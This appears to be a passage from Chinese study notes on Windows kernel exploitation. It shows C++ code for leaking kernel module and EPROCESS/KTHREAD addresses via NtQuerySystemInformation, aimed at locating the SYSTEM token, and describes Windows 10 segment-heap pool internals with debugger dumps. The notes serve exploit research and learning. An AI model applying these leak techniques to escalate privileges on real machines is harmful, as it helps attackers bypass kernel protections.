<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__kernel_entry NTSTATUS <span class="title">NtQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out]       PVOID                    SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG                    SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PULONG                   ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>但是Windows可能会限制用户模式下对系统信息的访问权限，包括对<code>NtQuerySystemInformation</code>函数的调用</p>
<p>有个不错的仓库：<a href="https://github.com/sam-b/windows_kernel_address_leaks">windows_kernel_address_leaks</a></p>
<h4 id="SystemModuleInformation"><a href="#SystemModuleInformation" class="headerlink" title="SystemModuleInformation"></a>SystemModuleInformation</h4><p>故名思意，查询模块的基地址</p>
<p>from: <a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/">HEVD Exploits</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">INT64 <span class="title">get_kernel_base</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;[&gt;] Getting kernel base address...&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//https://github.com/koczkatamas/CVE-2016-0051/blob/master/EoP/Shellcode/Shellcode.cpp</span></span><br><span class="line">    <span class="comment">//also using the same import technique that @tekwizz123 showed us</span></span><br><span class="line"></span><br><span class="line">    PNtQuerySystemInformation NtQuerySystemInformation =</span><br><span class="line">        (PNtQuerySystemInformation)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>),</span><br><span class="line">            <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NtQuerySystemInformation) </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] Failed to get the address of NtQuerySystemInformation.&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] Last error &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ULONG len = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;len);</span><br><span class="line"></span><br><span class="line">    PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)</span><br><span class="line">        <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line">            len,</span><br><span class="line">            MEM_RESERVE | MEM_COMMIT,</span><br><span class="line">            PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation,</span><br><span class="line">        pModuleInfo,</span><br><span class="line">        len,</span><br><span class="line">        &amp;len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0x0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] NtQuerySystemInformation failed!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PVOID kernelImageBase = pModuleInfo-&gt;Modules[<span class="number">0</span>].ImageBaseAddress;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;[&gt;] ntoskrnl.exe base address: 0x&quot;</span> &lt;&lt; hex &lt;&lt; kernelImageBase &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (INT64)kernelImageBase;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过其Name查询指定模块基址 <code>SYSTEM_MODULE_INFORMATION-&gt;Modules[ModulesCount].Name</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE</span> &#123;</span><br><span class="line">	ULONG                Reserved1;</span><br><span class="line">	ULONG                Reserved2;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">	ULONG				Reserved3;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	PVOID                ImageBaseAddress;</span><br><span class="line">	ULONG                ImageSize;</span><br><span class="line">	ULONG                Flags;</span><br><span class="line">	WORD                 Id;</span><br><span class="line">	WORD                 Rank;</span><br><span class="line">	WORD                 w018;</span><br><span class="line">	WORD                 NameOffset;</span><br><span class="line">	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];</span><br><span class="line">&#125;SYSTEM_MODULE, *PSYSTEM_MODULE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE_INFORMATION</span> &#123;</span><br><span class="line">	ULONG                ModulesCount;</span><br><span class="line">	SYSTEM_MODULE        Modules[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;</span><br></pre></td></tr></table></figure>

<h4 id="SystemExtendedHandleInformation"><a href="#SystemExtendedHandleInformation" class="headerlink" title="SystemExtendedHandleInformation"></a>SystemExtendedHandleInformation</h4><p>通过其指定的handle(<code>SYSTEM_HANDLE_INFORMATION_EX-&gt;Handles[HandleCount].UniqueProcessId</code>)查询Object</p>
<p>Handle</p>
<ul>
<li>Process的Handle，EPROCESS</li>
<li>Thread的Handle, ETHREAD<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE</span></span><br><span class="line">&#123;</span><br><span class="line">	PVOID Object;</span><br><span class="line">	HANDLE UniqueProcessId;</span><br><span class="line">	HANDLE HandleValue;</span><br><span class="line">	ULONG GrantedAccess;</span><br><span class="line">	USHORT CreatorBackTraceIndex;</span><br><span class="line">	USHORT ObjectTypeIndex;</span><br><span class="line">	ULONG HandleAttributes;</span><br><span class="line">	ULONG Reserved;</span><br><span class="line">&#125; SYSTEM_HANDLE, *PSYSTEM_HANDLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE_INFORMATION_EX</span></span><br><span class="line">&#123;</span><br><span class="line">	ULONG_PTR HandleCount;</span><br><span class="line">	ULONG_PTR Reserved;</span><br><span class="line">	SYSTEM_HANDLE Handles[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>查询pid为4，HandleValue为4, object代表SYSTEM进程EPROCESS的地址，从而可以获得token的地址</p>
<p>ETHREAD(KTHREAD) 的地址：当HandleValue为当前指定的Thread</p>
<ul>
<li>Thread可以OpenThread指定</li>
<li>还可以在Process中CreateThread</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> z = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; system_handle_info-&gt;NumberOfHandles; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> ((HANDLE)system_handle_info-&gt;Handles[i].HandleValue == hThread)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (system_handle_info-&gt;Handles[i].ObjectTypeIndex == ObjectThreadType)</span><br><span class="line">		&#123;</span><br><span class="line">			z++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> array_size = z - <span class="number">1</span>;</span><br><span class="line">PVOID* kThread_array = <span class="keyword">new</span> PVOID[array_size];</span><br><span class="line">z = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; system_handle_info-&gt;NumberOfHandles; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> ((HANDLE)system_handle_info-&gt;Handles[i].HandleValue == hThread)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (system_handle_info-&gt;Handles[i].ObjectTypeIndex == ObjectThreadType)</span><br><span class="line">		&#123;</span><br><span class="line">			kThread_array[z] = system_handle_info-&gt;Handles[i].Object;</span><br><span class="line">			z++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] KTHREAD address: %p\n&quot;</span>, kThread_array[array_size]);</span><br></pre></td></tr></table></figure>

<h3 id="Scoop-the-Windows-10-pool"><a href="#Scoop-the-Windows-10-pool" class="headerlink" title="Scoop the Windows 10 pool!"></a>Scoop the Windows 10 pool!</h3><p>内核池</p>
<p><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1</a></p>
<p><a href="https://ghostasky.github.io/posts/2023-8-scoopthewindows10pool/">Scoop The Windows 10 Pool 翻译</a></p>
<p><a href="https://ashlq.github.io/2023/08/22/Windows10%E5%86%85%E6%A0%B8%E6%B1%A0%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">Windows10内核池管理机制与利用方法 | Ash blog (ashlq.github.io)</a></p>
<p>比较新的一篇总结：<a href="https://xz.aliyun.com/t/13434?time__1311=mqmxnDBQqQq2D/D0Dx2DUEFxciD9WGrGYD">Windows内核利用小总结</a></p>
<h4 id="pool"><a href="#pool" class="headerlink" title="pool"></a>pool</h4><p>用户态操作在 <code>C\Windows\system32\ntdll.dll</code> 中，可以逆向看看。</p>
<p>在win10 2004（这一版本也被称为Win10 2020年五月更新版（代号是20H1）） 以及之前是</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">ExAllocatePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T                                         NumberOfBytes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG                                          Tag</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>在内核池中,所有<strong>单页的数据块的开头</strong>都是一个POOL_HEADER结构。这个结构包含了分配器和tag信息。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// win10 22h2</span></span><br><span class="line"><span class="number">1</span>: kd&gt; dt nt!_POOL_HEADER</span><br><span class="line">   +<span class="number">0x000</span> PreviousSize     : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> PoolIndex        : Pos <span class="number">8</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> BlockSize        : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> PoolType         : Pos <span class="number">8</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> Ulong1           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> PoolTag          : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> ProcessBilled    : Ptr64 _EPROCESS</span><br><span class="line">   +<span class="number">0x008</span> AllocatorBackTraceIndex : Uint2B</span><br><span class="line">   +<span class="number">0x00a</span> PoolTagHash      : Uint2B</span><br></pre></td></tr></table></figure>

<p>主要的PoolType:NonPagedPool,PagedPool,SessionPool,NonPagedPoolNx</p>
<ul>
<li>在win8中引入了NonPagedPoolNx,必须使用它来替代NonpagedPool类型.</li>
</ul>
<p><strong>PagedPool</strong>是分页内存，简单来说就是物理内存不够时，会把这片内存移动到硬盘上。</p>
<ul>
<li>一个物理地址能对应多个虚拟地址</li>
</ul>
<p>而<strong>NonPagedPool</strong>是无论物理内存如何紧缺，都绝对不把这片内存的内容移动到硬盘上。只能常驻于物理内存地址，不能映射</p>
<p>Segment Heap – 段堆自Windows 10 19H1开始用于内核空间，与用户空间中使用的段堆非常相似。就像在用户态使用的一样，段堆是为根据分配大小的不同提供不同的功能，为此来定义了多种不同类型的后端处理。  </p>
<p>win10之后堆分为两种：Segment heap和NT heap。当一个进程分配堆的时候，大部分场合默认使用的堆都是后面那种，前面的segment heap通常会在winapp或者某些特殊的进程（核心进程）中会使用到。 </p>
<p>这两种堆称为前端堆（Frontend Heap）和后端堆（Backend Heap）</p>
<p>低碎片堆(LFH)  &lt;&#x3D; 0x200<br>可变量大小后端(VS)  &lt;&#x3D; 0x20000<br>分段分配(SEG)  &lt;&#x3D; 0x7f0000<br>Large</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">RtlpHpAllocateHeapInternal</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3, <span class="type">unsigned</span> <span class="type">int</span> a4, <span class="type">int</span> *a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v10; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v6 = a3;</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v9 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt; (<span class="type">unsigned</span> <span class="type">int</span>)*(<span class="type">unsigned</span> __int16 *)(a1 + <span class="number">892</span>) - <span class="number">16</span></span><br><span class="line">    || (v10 = <span class="built_in">RtlpHpLfhContextAllocate</span>(a1 + <span class="number">832</span>, a2, a3, a4), a3 = (<span class="type">unsigned</span> <span class="type">int</span>)v6, a2 = (<span class="type">unsigned</span> <span class="type">int</span>)v7, v10 == <span class="number">-1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt; <span class="number">0x20000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &gt; *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">464</span>) )</span><br><span class="line">        v11 = <span class="built_in">RtlpHpLargeAlloc</span>(a1, v7, v6, a4);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v11 = <span class="built_in">RtlpHpSegAlloc</span>((<span class="type">unsigned</span> <span class="type">int</span>)a1 + (*(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">272</span>) &lt; v6 ? <span class="number">448</span> : <span class="number">256</span>), v7, v6, v6, a4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v11 = <span class="built_in">RtlpHpVsContextAllocate</span>(a1 + <span class="number">640</span>, a2, a3, a4);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = v11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a5 = v9;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>LFH,VS,SEG分别关联了对应的上下文(CONTEXT)，这些后端的上下文存储在<code>_SEGMENT_HEAP</code>结构中偏移0x100,0x280,0x340的位置</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_SEGMENT_HEAP</span><br><span class="line">   +<span class="number">0x000</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> GlobalFlags      : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Interceptor      : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> ProcessHeapListIndex : Uint2B</span><br><span class="line">   +<span class="number">0x01e</span> AllocatedFromMetadata : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x020</span> CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA</span><br><span class="line">   +<span class="number">0x020</span> ReservedMustBeZero1 : Uint8B</span><br><span class="line">   +<span class="number">0x028</span> UserContext      : Ptr64 Void</span><br><span class="line">   +<span class="number">0x030</span> ReservedMustBeZero2 : Uint8B</span><br><span class="line">   +<span class="number">0x038</span> Spare            : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> LargeMetadataLock : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> LargeAllocMetadata : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x058</span> LargeReservedPages : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> LargeCommittedPages : Uint8B</span><br><span class="line">   +<span class="number">0x068</span> StackTraceInitVar : _RTL_RUN_ONCE</span><br><span class="line">   +<span class="number">0x080</span> MemStats         : _HEAP_RUNTIME_MEMORY_STATS</span><br><span class="line">   +<span class="number">0x0d8</span> GlobalLockCount  : Uint2B</span><br><span class="line">   +<span class="number">0x0dc</span> GlobalLockOwner  : Uint4B</span><br><span class="line">   +<span class="number">0x0e0</span> ContextExtendLock : Uint8B</span><br><span class="line">   +<span class="number">0x0e8</span> AllocatedBase    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f0</span> UncommittedBase  : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f8</span> ReservedLimit    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x100</span> SegContexts      : [<span class="number">2</span>] _HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x280</span> VsContext        : _HEAP_VS_CONTEXT</span><br><span class="line">   +<span class="number">0x340</span> LfhContext       : _HEAP_LFH_CONTEXT</span><br></pre></td></tr></table></figure>

<p>不同的<code>POOL_TYPE</code>,都有1个<code>_SEGMENT_HEAP</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _POOL_TYPE</span><br><span class="line">ntdll!_POOL_TYPE</span><br><span class="line">   NonPagedPool = <span class="number">0</span>n0</span><br><span class="line">   NonPagedPoolExecute = <span class="number">0</span>n0</span><br><span class="line">   PagedPool = <span class="number">0</span>n1</span><br><span class="line">   NonPagedPoolMustSucceed = <span class="number">0</span>n2</span><br><span class="line">   DontUseThisType = <span class="number">0</span>n3</span><br><span class="line">   NonPagedPoolCacheAligned = <span class="number">0</span>n4</span><br><span class="line">   PagedPoolCacheAligned = <span class="number">0</span>n5</span><br><span class="line">   NonPagedPoolCacheAlignedMustS = <span class="number">0</span>n6</span><br><span class="line">   MaxPoolType = <span class="number">0</span>n7</span><br><span class="line">   NonPagedPoolBase = <span class="number">0</span>n0</span><br><span class="line">   NonPagedPoolBaseMustSucceed = <span class="number">0</span>n2</span><br><span class="line">   NonPagedPoolBaseCacheAligned = <span class="number">0</span>n4</span><br><span class="line">   NonPagedPoolBaseCacheAlignedMustS = <span class="number">0</span>n6</span><br><span class="line">   NonPagedPoolSession = <span class="number">0</span>n32</span><br><span class="line">   PagedPoolSession = <span class="number">0</span>n33</span><br><span class="line">   NonPagedPoolMustSucceedSession = <span class="number">0</span>n34</span><br><span class="line">   DontUseThisTypeSession = <span class="number">0</span>n35</span><br><span class="line">   NonPagedPoolCacheAlignedSession = <span class="number">0</span>n36</span><br><span class="line">   PagedPoolCacheAlignedSession = <span class="number">0</span>n37</span><br><span class="line">   NonPagedPoolCacheAlignedMustSSession = <span class="number">0</span>n38</span><br><span class="line">   NonPagedPoolNx = <span class="number">0</span>n512</span><br><span class="line">   NonPagedPoolNxCacheAligned = <span class="number">0</span>n516</span><br><span class="line">   NonPagedPoolSessionNx = <span class="number">0</span>n544</span><br></pre></td></tr></table></figure>

<h5 id="Segment-Backend"><a href="#Segment-Backend" class="headerlink" title="Segment Backend"></a>Segment Backend</h5><p>SegAlloc后端是用于分配大小在128 KB和7 GB之间的内存块。它也用于后台，为VS和LFH后端分配内存。  </p>
<p>段后端上下文存储在一个名为<code>_HEAP_SEG_CONTEXT</code>的结构中。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> SegmentMask      : Uint8B</span><br><span class="line">   +<span class="number">0x008</span> UnitShift        : UChar</span><br><span class="line">   +<span class="number">0x009</span> PagesPerUnitShift : UChar</span><br><span class="line">   +<span class="number">0x00a</span> FirstDescriptorIndex : UChar</span><br><span class="line">   +<span class="number">0x00b</span> CachedCommitSoftShift : UChar</span><br><span class="line">   +<span class="number">0x00c</span> CachedCommitHighShift : UChar</span><br><span class="line">   +<span class="number">0x00d</span> Flags            : &lt;anonymous-tag&gt;</span><br><span class="line">   +<span class="number">0x010</span> MaxAllocationSize : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> OlpStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x016</span> MemStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x018</span> LfhContext       : Ptr64 Void</span><br><span class="line">   +<span class="number">0x020</span> VsContext        : Ptr64 Void</span><br><span class="line">   +<span class="number">0x028</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x038</span> Heap             : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> SegmentLock      : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> SegmentListHead  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x058</span> SegmentCount     : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> FreePageRanges   : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x070</span> FreeSegmentListLock : Uint8B</span><br><span class="line">   +<span class="number">0x078</span> FreeSegmentList  : [<span class="number">2</span>] _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure>

<p>段存储在存储在SegmentListHead中的链表中。段头为<code>_HEAP_PAGE_SEGMENT</code>，后面是256个<code>_HEAP_PAGE_RANGE_DESCRIPTOR</code>结构。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_PAGE_SEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint8B</span><br><span class="line">   +<span class="number">0x018</span> SegmentCommitState : Ptr64 _HEAP_SEGMENT_MGR_COMMIT_STATE</span><br><span class="line">   +<span class="number">0x020</span> UnusedWatermark  : UChar</span><br><span class="line">   +<span class="number">0x000</span> DescArray        : [<span class="number">256</span>] _HEAP_PAGE_RANGE_DESCRIPTOR</span><br></pre></td></tr></table></figure>

<p><code>_HEAP_SEG_CONTEXT</code>中还维护了一个红黑树，而<code>_HEAP_PAGE_SEGMENT</code>中的Signature是每个<code>_HEAP_PAGE_SEGMEN</code>T都有的一个签名计算</p>
<p>计算方法：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Signature = Segment ^ SegContext ^ RtlpHpHeapGlobals ^ <span class="number">0xA2E64EADA2E64EAD</span>;</span><br><span class="line"><span class="comment">// SegContext: 所属的_HEAP_SEG_CONTEXT</span></span><br><span class="line">Segment = Addr &amp; SegContext-&gt;SegmentMask;</span><br></pre></td></tr></table></figure>

<h5 id="Variable-Size-Backend"><a href="#Variable-Size-Backend" class="headerlink" title="Variable Size Backend"></a>Variable Size Backend</h5><p>可变大小后端分配512B到128KB大小的块。它的目的是在提供对空闲块的重用。它存储在<code>_HEAP_VS_CONTEXT</code>结构体中。</p>
<ul>
<li>空闲块以<code>_HEAP_VS_CHUNK_FREE_HEADER</code>的专用结构体为头部。</li>
<li>而已经被分配的块都会以<code>_HEAP_VS_CHUNK_HEADER</code>的结构体开头。而header结构体中的所有字段都与RtlHpHeapGlobals和块的地址进行异或。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CONTEXT</span><br><span class="line">+<span class="number">0</span> x000 Lock : Uint8B</span><br><span class="line">+<span class="number">0</span> x008 LockType : _RTLP_HP_LOCK_TYPE</span><br><span class="line">+<span class="number">0</span> x010 FreeChunkTree : _RTL_RB_TREE</span><br><span class="line">+<span class="number">0</span> x020 SubsegmentList : _LIST_ENTRY</span><br><span class="line">+<span class="number">0</span> x030 TotalCommittedUnits : Uint8B</span><br><span class="line">+<span class="number">0</span> x038 FreeCommittedUnits : Uint8B</span><br><span class="line">+<span class="number">0</span> x040 DelayFreeContext : _HEAP_VS_DELAY_FREE_CONTEXT</span><br><span class="line">+<span class="number">0</span> x080 BackendCtx : Ptr64 Void</span><br><span class="line">+<span class="number">0</span> x088 Callbacks : _HEAP_SUBALLOCATOR_CALLBACKS</span><br><span class="line">+<span class="number">0</span> x0b0 Config : _RTL_HP_VS_CONFIG</span><br><span class="line">+<span class="number">0</span> x0b4 Flags : Uint4B</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CHUNK_HEADER</span><br><span class="line">+<span class="number">0</span> x000 Sizes : _HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="line">+<span class="number">0</span> x008 EncodedSegmentPageOffset : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">+<span class="number">0</span> x008 UnusedBytes : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">+<span class="number">0</span> x008 SkipDuringWalk : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">+<span class="number">0</span> x008 Spare : Pos <span class="number">10</span>, <span class="number">22</span> Bits</span><br><span class="line">+<span class="number">0</span> x008 AllocatedChunkBits : Uint4B</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="line">+<span class="number">0</span> x000 MemoryCost : Pos <span class="number">0</span>, <span class="number">16</span> Bits</span><br><span class="line">+<span class="number">0</span> x000 UnsafeSize : Pos <span class="number">16</span>, <span class="number">16</span> Bits</span><br><span class="line">+<span class="number">0</span> x004 UnsafePrevSize : Pos <span class="number">0</span>, <span class="number">16</span> Bits</span><br><span class="line">+<span class="number">0</span> x004 Allocated : Pos <span class="number">16</span>, <span class="number">8</span> Bits</span><br><span class="line">+<span class="number">0</span> x000 KeyUShort : Uint2B</span><br><span class="line">+<span class="number">0</span> x000 KeyULong : Uint4B</span><br><span class="line">+<span class="number">0</span> x000 HeaderBits : Uint8B</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CHUNK_FREE_HEADER</span><br><span class="line">+<span class="number">0</span> x000 Header : _HEAP_VS_CHUNK_HEADER</span><br><span class="line">+<span class="number">0</span> x000 OverlapsHeader : Uint8B</span><br><span class="line">+<span class="number">0</span> x008 Node : _RTL_BALANCED_NODE</span><br></pre></td></tr></table></figure>

<p>已被分配的块都以<code>_HEAP_VS_CHUNK_HEADER</code>的结构体开头。而header结构体中的所有字段都与RtlHpHeapGlobals和块的地址进行异或。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Chunk-&gt;Sizes = Chunk-&gt;Sizes ^ Chunk ^ RtlpHpHeapGlobals ;</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dq ffff998533f74440 L2</span><br><span class="line">ffff9985`<span class="number">33f</span>74440  <span class="number">88</span>a74e1e`<span class="number">7e507045</span> ffff9985`<span class="number">00000049</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dt _HEAP_VS_CHUNK_HEADER ffff998533f74440</span><br><span class="line">ntdll!_HEAP_VS_CHUNK_HEADER</span><br><span class="line">   +<span class="number">0x000</span> Sizes            : _HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="line">   +<span class="number">0x008</span> EncodedSegmentPageOffset : <span class="number">0</span>y01001001 (<span class="number">0x49</span>)</span><br><span class="line">   +<span class="number">0x008</span> UnusedBytes      : <span class="number">0</span>y0</span><br><span class="line">   +<span class="number">0x008</span> SkipDuringWalk   : <span 